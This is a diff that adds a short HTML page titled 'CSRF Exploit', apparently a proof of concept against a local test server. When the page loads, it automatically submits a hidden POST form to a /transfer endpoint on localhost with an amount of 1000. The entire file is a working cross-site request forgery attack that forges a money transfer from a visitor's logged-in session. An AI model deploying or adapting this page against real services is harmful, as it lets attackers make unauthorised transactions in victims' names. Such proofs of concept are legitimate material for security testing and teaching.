@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Exploit</title>
+</head>
+<body onload="document.getElementById('csrf-form').submit();">
+    <form id="csrf-form" action="http://localhost:8080/transfer" method="POST">
+        <input type="hidden" name="amount" value="1000">
+    </form>
+</body>
+</html>
